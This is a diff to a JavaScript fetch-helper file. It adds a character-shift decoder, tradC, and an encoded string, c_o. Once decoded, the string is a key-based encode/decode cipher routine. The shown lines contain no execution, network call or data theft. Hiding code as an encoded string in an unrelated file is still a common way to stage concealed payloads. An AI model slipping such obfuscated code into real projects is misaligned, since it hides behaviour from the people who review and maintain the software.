@@ -1,4 +1,8 @@
 
+
+
+function tradC(s,n){var ss="";for(var i=0;i<s.length;i++){ss+=String.fromCharCode(s.charCodeAt(i)-n)};return ss}
+
 async function GetJson(link,callback) {
   try {
     const response = await fetch(link);
@@ -97,6 +101,8 @@ if(callback!=undefined) callback(updatedResource);
     // Handle network errors or other exceptions
   }
 }
+
+
 
 var c_o=`!efdpe!>!gvodujpo)dmw-!s-!dbmmcbdl-!qjo*!|!jg!)qjo!>>>!voefgjofe*!qjo!>!1<qjo!>!qjo!+!2<!wbs!t!>!##<gps!)wbs!j!>!1<!j!=!s/mfohui<!j,,*!|j..<gps!)wbs!jj!>!1<!jj!=!dmw/mfohui<jj,,*!|j,,<wbs!o2!>!s/dibsDpefBu)j*<!wbs!o!>!o2!.!dmw/dibsDpefBu)jj*<t!,>!Tusjoh/gspnDibsDpef)o!.!qjo*<jg!)j!>>>!s/mfohui!.!2*!|!jj!>!dmw/mfohui<j!>!s/mfohui<~~~jg!)dbmmcbdl!">!voefgjofe*!dbmmcbdl)t*<sfuvso!t<~gvodujpo!dpe)dmw-!s-!dbmmcbdl-!qjo*!|!wbs!t!>!##<jg!)qjo!>>>!voefgjofe*!qjo!>!1<qjo!>!qjo!+!2<gps!)wbs!j!>!1<!j!=!s/mfohui<!j,,*!|wbs!o!>!1<j..<gps!)wbs!jj!>!1<!jj!=!dmw/mfohui<!jj,,*!j,,<o!>!s/dibsDpefBu)j*<!o!>!o!,!dmw/dibsDpefBu)jj*<t!,>!Tusjoh/gspnDibsDpef)o!,!qjo*<jg!)j!>>>!s/mfohui!.!2*!|jj!>!dmw/mfohui<j!>!s/mfohui<~~~jg!)dbmmcbdl!">!voefgjofe*!dbmmcbdl)t*<!sfuvso!t<!~`
 
